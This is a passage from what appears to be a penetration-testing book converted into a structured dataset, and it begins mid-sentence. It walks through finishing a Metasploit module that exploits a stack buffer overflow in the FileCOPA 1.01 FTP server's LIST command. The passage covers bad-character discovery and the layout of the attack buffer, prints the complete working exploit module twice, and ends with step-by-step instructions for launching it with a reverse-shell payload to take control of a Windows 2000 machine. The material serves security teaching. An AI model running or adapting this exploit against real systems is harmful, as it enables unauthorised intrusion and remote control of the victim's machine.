    by our module. The `\xcc` or `int3` is a software interrupt that causes OllyDbg
    to stop as if you had inserted a breakpoint in the code. At this point, we don't
    care about tracing the code; we just want to make sure our payload is solid. The
    interrupt pauses execution, allowing you to observe the characters sent by MSF
    to find which ones, if any, didn't make it through. If any of the characters are
    changed, manipulated, or otherwise different, then we remove them from the list.
  prefs: []
  type: TYPE_NORMAL
- en: You'll know which characters didn't survive because the stream was sequential,
    and there will be one character out of place if anything happened. This process
    is repeated because the stream will only reveal one bad character at a time. You
    have to repeat this process until your steam arrives intact. Once that happens,
    you will have found all of the bad characters. This time-consuming work will ensure
    the encoded payload arrives properly. The bad characters are important when creating
    a NOP sled (no operations that slide into our shellcode) as well as when encoding
    the payload. A *NOP sled* is a segment of code that results in no operations when
    executed. A simple "no operation" command would be `0x90`, which is computer operation
    code for "do nothing." Another example is to increment a register, then decrement
    the same register, resulting in an unchanged state.
  prefs: []
  type: TYPE_NORMAL
- en: '![Tracking down bad characters](../Images/00021.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 10-5. Tracking down bad characters
  prefs: []
  type: TYPE_NORMAL
- en: 'You can see from [Figure 10-5](#filepos827317) that `\x0a` and `\x0d` are not
    included. The bad characters I found in this exploit are:'
  prefs: []
  type: TYPE_NORMAL
- en: '`\x00\x0b\x0a\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c`'
  prefs: []
  type: TYPE_NORMAL
- en: 'These are added to the module and assigned to `BadChars`. Now, we shift our
    attention to the `exploit` method and finish the module. Using a fuzzer such as
    SPIKE (an open source fuzzing framework written by Dave Aitel), you will find
    the vulnerability and the type of string used to crash the FTP server. The length
    of the string is important because it will reveal how much space we have to put
    in our payload. We can also look at the advisory for the proof of concept used
    to crash the application. The string will look similar to this:'
  prefs: []
  type: TYPE_NORMAL
- en: '`LIST A BBBBBBBBBBBBBBBBBBBBBB...x 350...BBBBBBBBBB`'
  prefs: []
  type: TYPE_NORMAL
- en: 'Since there isn''t enough space to insert our shellcode before the jump address,
    we need to modify our `buf` contents. The new attack string will look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '`buf  = "A\x20" + rand_text_english(160, payload_badchars) buf << [target.ret].pack(''V'')
    buf << make_nops(4) + jmp_ecx buf << make_nops(444) + payload.encoded + "\r\n"`'
  prefs: []
  type: TYPE_NORMAL
- en: Breaking down each line, the `A\x20` represents the letter *A* followed by one
    space (`\x20` is the hexadecimal representation of a space). Then 160 bytes of
    random characters are appended as padding. This number came from the offset found
    by *pattern_offset.rb*. The method `payload_badchars` ensures that none of the
    bad characters will end up in the random data. The return address is then added
    to the payload and converted to a usable address by the `pack` method. The `V`
    argument converts the return address to a specific binary sequence known as *little-endian*
    byte order.
  prefs: []
  type: TYPE_NORMAL
- en: 'After the return address, we add four NOPs to `buf`. The NOPs don''t do anything
    other than fill the space. The difference between the `payload_badchars` and `make_nops`
    method is this: if `make_nops` is executed, it won''t affect the exploit execution.'
  prefs: []
  type: TYPE_NORMAL
- en: The next piece of the malicious string, `buf`, is tricky. Since there wasn't
    enough space before the return address to place a full-sized payload, we use a
    trick to jump to the payload. This is called a *shared library trampoline*. The
    basic idea is that instead of getting the instruction pointer to point to the
    payload address directly, we will look for our payload address in the registers
    and load the register's contents into the instruction pointer. All we need to
    ensure success is for the register to have an address pointing somewhere between
    the NOP sled and the start of our payload.
  prefs: []
  type: TYPE_NORMAL
- en: In this case, the address located in the ECX register will be pushed on the
    stack and then the `return` method will be called. The `return` function causes
    the payload address on the stack to be loaded into the instruction pointer and
    will result in our payload being executed. The transition from the FTP server
    execution to our payload is when we officially get control of the process. The
    exploit won't work unless this transition is perfect.
  prefs: []
  type: TYPE_NORMAL
- en: The last two pieces of our evil `LIST` argument are a sizeable NOP sled (444
    characters in length) and the encoded payload. The whole string is terminated
    by a carriage return and newline feed which let the FTP server know we are done
    sending data. `buf` contains a very large string, but as you can see in the example
    code, it's broken up on each line.
  prefs: []
  type: TYPE_NORMAL
- en: 'To complete the exploit, our module sends the command `LIST` with our malicious
    string contained in `buf`. The results are a rooted Windows 2000 Service Pack
    4 machine. If you have never used MSF, then the `reverse_shell` connection is
    a good payload with which to start. The payload tells the victim machine to send
    a command prompt to your address. The `handler` catches the session and allows
    you to have complete control over the machine. The other nice feature about a
    reverse connection is that, since the connection originates from within the victim''s
    network, it easily bypasses a firewall. Now your module should look like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '`require ''msf/core''  module Msf    class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote      include Exploit::Remote::Ftp      def initialize(info
    = {})       super(update_info(info,              ''Name''           => ''FileCOPA
    1.01 <= List Overflow'',           ''Description''    => %q{This module exploits
    a stack overflow in the FileCOPA multi-protocol file transfer service. A valid
    user account (or anonymous access) is required for this exploit to work.      
         },           ''Author''         => ''Steve <Steve@nostarch.com>'',       
       ''License''        => MSF_LICENSE,           ''Version''        => ''$Revision:
    4498 $'',           ''References''   =>             [             [''OSVDB'',
    ''27389''],           ],           ''Privileged''     => true,           ''DefaultOptions''
    =>             {             ''EXITFUNC'' => ''thread'',           },         
     ''Payload''        =>             {             ''Space''    => 1000,       
         ''BadChars'' => "\x00",           },           ''Targets''        =>     
           [             [               ''Windows 2000 Professional SP4 English'',
                  {                 ''Platform'' => ''win'',                 ''Ret''
         => 0XDEADBEEF,               },             ],           ]))     end    
     def exploit       connect_login        print_status("Trying target #{target.name}...")    
       jmp_ecx = "\x66\x81\xc1\xa0\x01\x51\xc3"        buf  = "A\x20" + rand_text_english(160,
    payload_badchars)       buf << [target.ret].pack(''V'')       buf << make_nops(4)
    + jmp_ecx buf << make_nops(444) + payload.encoded + "\r\n"        send_cmd( [''LIST'',
    buf] , false)        handler       disconnect     end   endend`'
  prefs: []
  type: TYPE_NORMAL
- en: 'There are some features of MSF that can help polish up the exploit process
    a bit. We are going to add another method called `check` to the module in between
    `initialize` and `exploit`. This method will determine whether a target is vulnerable
    to this exploit by analyzing the banner. To do this, we''d have to know what the
    banner of a vulnerable system looks like. A word of caution: If the system administrator
    changed the banner, then this check won''t work. Since most banners are left intact,
    this generally streamlines the target validation process.'
  prefs: []
  type: TYPE_NORMAL
- en: 'The module will connect to port 21 on the target machine, grab the banner,
    and then disconnect. If the banner contains *FileCOPA FTP Server Version 1.01*,
    we know the target is vulnerable. If the banner check fails, then we may want
    to look for another attack vector, or we can try the exploit anyway. The code
    for the check method is shown below:'
  prefs: []
  type: TYPE_NORMAL
- en: '`def check     connect     disconnect     if (banner =~ /FileCOPA FTP Server
    Version 1\.01/)         return Exploit::CheckCode::Vulnerable     end     return
    Exploit::CheckCode::Safe end`'
  prefs: []
  type: TYPE_NORMAL
- en: 'Now putting all of the MSF module code together, you get a fully functioning
    exploit:'
  prefs: []
  type: TYPE_NORMAL
- en: '`require ''msf/core''  module Msf    class Exploits::Windows::Ftp::FileCopa_List
    < Msf::Exploit::Remote      include Exploit::Remote::Ftp      def initialize(info
    = {})       super(update_info(info,           ''Name''           => ''FileCOPA
    1.01 <= List Overflow'',           ''Description''    => %q{This module exploits
    a stack overflow in the FileCOPA multi-protocol file transfer service. A valid
    user account (or anonymous access) is required for this exploit to work.     
         },           ''Author''         => ''Steve <Steve@nostarch.com>'',       
       ''License''        => MSF_LICENSE,           ''Version''        => ''$Revision:
    4498 $'',           ''References''   =>             [             [''OSVDB'',
    ''27389''],           ],           ''Privileged''     => true,           ''DefaultOptions''
    =>             {             ''EXITFUNC'' => ''thread'',           },         
     ''Payload''        =>             {             ''Space''    => 400,         
       ''BadChars'' => "\x00\x0b\x0a\x0d\x20\x23\x25\x26\x2b\x2f\x3a\x3f\x5c",   
             ''SaveRegisters'' => [''ecx''],           },           ''Targets''  
         =>             [             [               ''Windows 2000 Professional
    SP4 English'',               {                 ''Platform'' => ''win'',       
             ''Ret''      => 0x77E14C29,               },             ],         
     ]))     end      def check       connect       disconnect       if (banner =~
    /FileCOPA FTP Server Version 1\.01/)         return Exploit::CheckCode::Vulnerable
          end       return Exploit::CheckCode::Safe     end      def exploit     
     connect_login        print_status("Trying target #{target.name}...")        jmp_ecx
    = "\x66\x81\xc1\xa0\x01\x51\xc3"        buf  = "A\x20" + rand_text_english(160,
    payload_badchars)       buf << [target.ret].pack(''V'')       buf << make_nops(4)
    + jmp_ecx buf << make_nops(444) + payload.encoded + "\r\n"        send_cmd( [''LIST'',
    buf] , false)        handler       disconnect     end   end end`'
  prefs: []
  type: TYPE_NORMAL
- en: 'That completes the exploit. All that is left to do is test it out. So restart
    the FTP server on the victim machine, and reload the `FileCOPA` module on your
    attack machine. A quick rundown of the steps is listed below:'
  prefs: []
  type: TYPE_NORMAL
- en: Search for *FileCOPA* in the MSF GUI.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Double-click the **FileCOPA LIST Exploit**.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: A new window will pop up.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Choose the correct target from the drop-down menu: **Windows 2k Server SP4
    English**.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'Choose a payload: **generic/shell_reverse_tcp**.'
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: You'll need to add `RHOST`, which is the remote host, and `LHOST`, the local
    host.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Click **Apply**—this will launch the exploit.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: The window will close, and a new job will be displayed in the Jobs pane.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If the exploit was successful, you will have a new session in the Session pane.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: To see what happened after you hit Apply, click the **Module Output** tab in
    the lower-left pane.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Now you have a shell, and we get to the "managing phase" mentioned at the beginning
    of the chapter. This example went pretty quickly, and I've always found exploiting
    systems on my own more time consuming than when following along with an example.
    If you decide to try these techniques on your own, remember to have patience.
    This is a game of perpetual learning, so don't forget to enjoy the journey. Happy
    hacking! ;-)
  prefs: []
  type: TYPE_NORMAL
